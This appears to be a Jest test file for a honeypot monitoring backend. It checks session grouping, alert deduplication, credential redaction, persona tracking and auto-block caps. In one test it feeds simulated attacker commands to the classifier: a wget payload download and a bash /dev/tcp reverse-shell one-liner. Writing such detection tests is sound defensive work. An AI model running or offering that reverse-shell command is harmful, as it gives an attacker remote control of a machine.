'use strict'
/**
 * Phase 4 audit fixes (docs/HONEYPOT_STUDY_GUIDE.md) on a real in-memory MongoDB:
 * M1 one open threat per IP per window, M2 alert once, M4 capped arrays with totals, M7 persona stamped at
 * session open, H3 hourly cap on honeypot-originated auto-blocks.
 */
const mongoose = require('mongoose')
const { MongoMemoryServer } = require('mongodb-memory-server')

const mockPredict = jest.fn()
jest.mock('../services/aiEngineService', () => ({
  predictHoneypotSession: (...a) => mockPredict(...a),
  getDeceptionScore: jest.fn().mockResolvedValue(null),
  getBlockThreshold: jest.fn().mockResolvedValue(0.92),
  getAlertThreshold: jest.fn().mockResolvedValue(0.9),
}))
jest.mock('../services/aiService', () => ({ storePrediction: jest.fn().mockResolvedValue({}) }))
jest.mock('../services/campaignService', () => ({ clusterSession: jest.fn() }))
const mockEmitNewThreat = jest.fn()
jest.mock('../websocket/socketManager', () => ({
  emitHoneypotEvent: jest.fn(),
  emitNewThreat: (...a) => mockEmitNewThreat(...a),
  emitThreatUpdated: jest.fn(),
}))
const mockAutoBlock = jest.fn().mockResolvedValue({ success: true })
jest.mock('../services/containmentService', () => ({ executeAutoBlock: (...a) => mockAutoBlock(...a) }))

const HoneypotSession = require('../models/HoneypotSession')
const ThreatLog = require('../models/ThreatLog')
const SystemSetting = require('../models/SystemSetting')
const BlockedIP = require('../models/BlockedIP')
const honeypotService = require('../services/honeypotService')
const collector = require('../../honeypot/collectors/session_collector')

const ENV = [
  'HONEYPOT_MAX_COMMANDS',
  'HONEYPOT_MAX_CREDENTIALS',
  'HONEYPOT_AUTOBLOCK_MAX_PER_HOUR',
  'HONEYPOT_THREAT_WINDOW_MINUTES',
]

describe('Phase 4 honeypot audit fixes', () => {
  let mongoServer
  beforeAll(async () => {
    mongoServer = await MongoMemoryServer.create()
    await mongoose.connect(mongoServer.getUri())
  }, 60000)
  afterAll(async () => {
    await mongoose.disconnect()
    if (mongoServer) await mongoServer.stop()
  })
  beforeEach(async () => {
    jest.clearAllMocks()
    for (const k of ENV) delete process.env[k]
    for (const c of ['honeypotsessions', 'threatlogs', 'alerts', 'systemsettings', 'blockedips'])
      await mongoose.connection.db.collection(c).deleteMany({})
    mockPredict.mockResolvedValue({ success: false })
  })

  const open = (sessionId, sourceIP = '198.51.100.30') => collector.onSessionOpened({ sessionId, sourceIP })

  test('M1: repeat connections from one IP share one open threat and announce it once', async () => {
    const a = await open('m1-a')
    const b = await open('m1-b')
    const c = await open('m1-c', '198.51.100.31')
    expect(String(a.linkedThreatLog)).toBe(String(b.linkedThreatLog))
    expect(String(c.linkedThreatLog)).not.toBe(String(a.linkedThreatLog))
    expect(await ThreatLog.countDocuments()).toBe(2)
    expect(mockEmitNewThreat).toHaveBeenCalledTimes(2)
  })

  test('M1: a blocked or expired threat is not reused; window 0 restores one threat per session', async () => {
    const a = await open('m1-blocked')
    await ThreatLog.updateOne({ _id: a.linkedThreatLog }, { $set: { status: 'BLOCKED' } })
    const b = await open('m1-after-block')
    expect(String(b.linkedThreatLog)).not.toBe(String(a.linkedThreatLog))
    process.env.HONEYPOT_THREAT_WINDOW_MINUTES = '0'
    const c = await open('m1-window-0')
    expect(String(c.linkedThreatLog)).not.toBe(String(b.linkedThreatLog))
  })

  test('M2: the same downloaded URL alerts once per session; a different URL alerts again', async () => {
    await open('m2')
    const dl = (url, eventId) => collector.onFileDownload({ sessionId: 'm2', sourceIP: '198.51.100.30', url, eventId })
    await dl('http://x.test/a', 'aaaaaaaaaaaaaaaa')
    await dl('http://x.test/a', 'bbbbbbbbbbbbbbbb') // distinct event, same file
    await dl('http://x.test/b', 'cccccccccccccccc')
    const titles = (await mongoose.connection.db.collection('alerts').find().toArray()).map((a) => a.message)
    expect(titles.sort()).toEqual([
      '198.51.100.30 downloaded http://x.test/a',
      '198.51.100.30 downloaded http://x.test/b',
    ])
    expect((await HoneypotSession.findOne({ sessionId: 'm2' })).downloadCount).toBe(3)
  })

  test('M4: commands and credentials are capped while totals keep counting', async () => {
    process.env.HONEYPOT_MAX_COMMANDS = '3'
    process.env.HONEYPOT_MAX_CREDENTIALS = '10'
    await open('m4')
    for (let i = 0; i < 5; i++)
      await collector.onCommandReceived({ sessionId: 'm4', sourceIP: '198.51.100.30', command: `echo ${i}` })
    let s = await HoneypotSession.findOne({ sessionId: 'm4' })
    expect(s.commands.map((c) => c.command)).toEqual(['echo 0', 'echo 1', 'echo 2'])
    expect(s.commandCount).toBe(5)
    expect(s.engagementLevel).toBe('medium') // from the total (5), not the capped array (3)
    const creds = Array.from({ length: 700 }, (_, i) => ({ username: 'root', password: `p${i}`, success: false }))
    await honeypotService.closeSession(s._id, { telemetry: { durationSeconds: 5, credentials: creds } })
    s = await HoneypotSession.findOne({ sessionId: 'm4' })
    expect(s.credentials).toHaveLength(10)
    expect(s.credentialCount).toBe(700)
    expect(s.credentials.every((c) => c.password === '***REDACTED***')).toBe(true)
  })

  test('M7: the persona served at session open is credited, even if it changes before close', async () => {
    await SystemSetting.create({ key: 'deceptionActiveProfile', value: 'debian_11' })
    const s = await open('m7')
    expect(s.servedProfile).toBe('debian_11')
    await SystemSetting.updateOne({ key: 'deceptionActiveProfile' }, { $set: { value: 'aws_ec2' } })
    await honeypotService.closeSession(s._id, { telemetry: { durationSeconds: 3 } })
    expect((await HoneypotSession.findById(s._id)).servedProfile).toBe('debian_11')
  })

  test('C1: the persona the honeypot reports is credited over a stale recorded setting', async () => {
    // No setting recorded: the fallback would be centos_7 while Cowrie serves ubuntu_22 (live run 2026-10-22).
    const a = await collector.onSessionOpened({
      sessionId: 'c1-a',
      sourceIP: '198.51.100.40',
      servedProfile: 'ubuntu_22',
    })
    expect(a.servedProfile).toBe('ubuntu_22')
    await SystemSetting.create({ key: 'deceptionActiveProfile', value: 'debian_11' })
    const b = await collector.onSessionOpened({
      sessionId: 'c1-b',
      sourceIP: '198.51.100.40',
      servedProfile: 'aws_ec2',
    })
    expect(b.servedProfile).toBe('aws_ec2')
    // The closure keeps it and sends it to the Q-learner as the action.
    await honeypotService.closeSession(b._id, { telemetry: { durationSeconds: 3 } })
    expect((await HoneypotSession.findById(b._id)).servedProfile).toBe('aws_ec2')
  })

  test('C1: without a valid reported persona the recorded setting is still used', async () => {
    await SystemSetting.create({ key: 'deceptionActiveProfile', value: 'debian_11' })
    const a = await collector.onSessionOpened({ sessionId: 'c1-none', sourceIP: '198.51.100.41' })
    const b = await collector.onSessionOpened({
      sessionId: 'c1-bad',
      sourceIP: '198.51.100.41',
      servedProfile: 'solaris_9',
    })
    expect(a.servedProfile).toBe('debian_11')
    expect(b.servedProfile).toBe('debian_11')
  })

  test('M7: the learner state is the persona of the session that started before, not a later one', async () => {
    const t0 = Date.now()
    await HoneypotSession.create({
      sessionId: 'earlier',
      sourceIP: '198.51.100.40',
      servedProfile: 'raspberry_pi',
      createdAt: new Date(t0 - 60000),
    })
    const s = await HoneypotSession.create({
      sessionId: 'target',
      sourceIP: '198.51.100.40',
      servedProfile: 'centos_7',
      createdAt: new Date(t0 - 30000),
    })
    await HoneypotSession.create({
      sessionId: 'later',
      sourceIP: '198.51.100.40',
      servedProfile: 'ubuntu_22',
      createdAt: new Date(t0),
    })
    const getDeceptionScore = require('../services/aiEngineService').getDeceptionScore
    await honeypotService.closeSession(s._id, { telemetry: { durationSeconds: 3 } })
    expect(getDeceptionScore.mock.calls[0][0]).toMatchObject({
      deceptionProfile: 'centos_7',
      previousProfile: 'raspberry_pi',
    })
  })

  test('H3: honeypot auto-blocks stop at the hourly cap; the threat is kept for manual review', async () => {
    process.env.HONEYPOT_AUTOBLOCK_MAX_PER_HOUR = '2'
    await SystemSetting.create({ key: 'autoBlockEnabled', value: true })
    mockPredict.mockResolvedValue({ success: true, result: { predictedClass: 'RCE Attempt', threatScore: 0.99 } })
    const close = async (sessionId, ip) => {
      const s = await open(sessionId, ip)
      await honeypotService.closeSession(s._id, { telemetry: { durationSeconds: 3 } })
    }
    await close('h3-a', '203.0.113.81')
    expect(mockAutoBlock).toHaveBeenCalledTimes(1)
    await BlockedIP.create([
      { ip: '203.0.113.90', reason: 'AI Classifier Autonomous Action (score = 0.99)', blockedAt: new Date() },
      { ip: '203.0.113.91', reason: 'AI Honeypot Session Block (threatScore = 0.99)', blockedAt: new Date() },
    ])
    await close('h3-b', '203.0.113.82')
    expect(mockAutoBlock).toHaveBeenCalledTimes(1) // budget spent: no further block
    const t = await ThreatLog.findOne({ sourceIP: '203.0.113.82' })
    expect(t.status).toBe('MONITORING')
    expect(t.aiScore).toBe(0.99)
  })

  describe('Phase 5 guide fixes (docs/COWRIE_COMPLETE_GUIDE.md)', () => {
    const IP = '198.51.100.60'
    const cmd = (sessionId, command, extra = {}) =>
      collector.onCommandReceived({
        sessionId,
        sourceIP: IP,
        command,
        intent: collector.classifyIntent(command),
        ...extra,
      })
    const alerts = () => mongoose.connection.db.collection('alerts').find().toArray()

    test('H4: the session-open placeholder threat is an intrusion attempt, not brute force', async () => {
      const s = await open('h4-open', IP)
      expect((await ThreatLog.findById(s.linkedThreatLog)).attackType).toBe('SSH Intrusion Attempt')
    })

    test('H4: the AI engine gets failed logins of this session and of the same source recently', async () => {
      const fail = (n) => Array.from({ length: n }, () => ({ username: 'root', password: 'x', success: false }))
      for (const id of ['h4-a', 'h4-b', 'h4-c']) {
        const s = await open(id, IP)
        await honeypotService.closeSession(s._id, { telemetry: { durationSeconds: 1, credentials: fail(1) } })
      }
      const other = await open('h4-other-ip', '198.51.100.61')
      await honeypotService.closeSession(other._id, { telemetry: { durationSeconds: 1, credentials: fail(9) } })
      const last = await open('h4-d', IP)
      await honeypotService.closeSession(last._id, { telemetry: { durationSeconds: 1, credentials: fail(2) } })
      expect(mockPredict.mock.calls.at(-1)[0]).toMatchObject({ failedLogins: 2, recentFailedLogins: 3 })
    })

    test('M1: a failed command marks the stored command unsuccessful, once, without adding one', async () => {
      await open('m1-failed', IP)
      await cmd('m1-failed', 'ls')
      await cmd('m1-failed', 'cd /tmp; notreal -x')
      const failed = { sessionId: 'm1-failed', sourceIP: IP, command: 'notreal -x ', eventId: 'f'.repeat(32) }
      expect(await collector.onCommandFailed(failed)).toBeTruthy()
      await collector.onCommandFailed(failed) // replayed event: no-op
      const s = await HoneypotSession.findOne({ sessionId: 'm1-failed' })
      expect(s.commands.map((c) => [c.command, c.success])).toEqual([
        ['ls', true],
        ['cd /tmp; notreal -x', false],
      ])
      expect(s.commandCount).toBe(2)
      expect(await collector.onCommandFailed({ ...failed, sessionId: 'no-such-session' })).toBeNull()
    })

    test('M2: a download command alerts HIGH; only a real download alerts CRITICAL', async () => {
      await open('m2-intent', IP)
      await cmd('m2-intent', 'wget http://x.test/a.sh')
      let titles = (await alerts()).map((a) => [a.title, a.severity])
      expect(titles).toEqual([['High-Value: MALWARE_DOWNLOAD', 'HIGH']])
      await cmd('m2-intent', 'bash -i >& /dev/tcp/1.2.3.4/4444 0>&1')
      await collector.onFileDownload({
        sessionId: 'm2-intent',
        sourceIP: IP,
        url: 'http://x.test/a.sh',
        eventId: 'a'.repeat(32),
      })
      titles = (await alerts()).map((a) => [a.title, a.severity])
      expect(titles).toEqual(
        expect.arrayContaining([
          ['High-Value: REVERSE_SHELL', 'CRITICAL'],
          ['Malware Downloaded in Honeypot', 'CRITICAL'],
        ])
      )
    })

    test('M3: uploads and port-forward attempts are recorded and alerted once', async () => {
      await open('m3', IP)
      const sha = 'b'.repeat(64)
      const up = { sessionId: 'm3', sourceIP: IP, filename: '/tmp/x', sha256: sha, eventId: 'c'.repeat(32) }
      await collector.onFileUpload(up)
      await collector.onFileUpload(up)
      const tunnel = { sessionId: 'm3', sourceIP: IP, dstIP: '203.0.113.9', dstPort: 25, eventId: 'd'.repeat(32) }
      await collector.onTunnelRequest(tunnel)
      await collector.onTunnelRequest(tunnel)
      const s = await HoneypotSession.findOne({ sessionId: 'm3' })
      expect(s.iocExtracted.hashes).toEqual([sha])
      expect(s.iocExtracted.ips).toEqual(['203.0.113.9'])
      expect(s.malwareDownloaded).toEqual(['upload:/tmp/x'])
      const titles = (await alerts()).map((a) => [a.title, a.severity]).sort()
      expect(titles).toEqual([
        ['File Uploaded to Honeypot', 'CRITICAL'],
        ['Port-Forward Attempt', 'HIGH'],
      ])
    })

    test('M8: demo sessions are left out of the analytics KPIs', async () => {
      await open('demo-abc12345', '198.51.100.70')
      await open('real-1', '198.51.100.71')
      const { kpis, intelligence } = await honeypotService.getFullAnalytics()
      expect(kpis.totalToday).toBe(1)
      expect(kpis.uniqueIPsToday).toBe(1)
      expect(intelligence.topAttackers.map((a) => a._id)).toEqual(['198.51.100.71'])
    })

    test('L5: the node port follows HONEYPOT_SSH_PORT', async () => {
      process.env.HONEYPOT_SSH_PORT = '22'
      try {
        expect((await honeypotService.getNodeStatus())[0].port).toBe(22)
        process.env.HONEYPOT_SSH_PORT = 'junk'
        expect((await honeypotService.getNodeStatus())[0].port).toBe(2222)
      } finally {
        delete process.env.HONEYPOT_SSH_PORT
      }
    })
  })
})
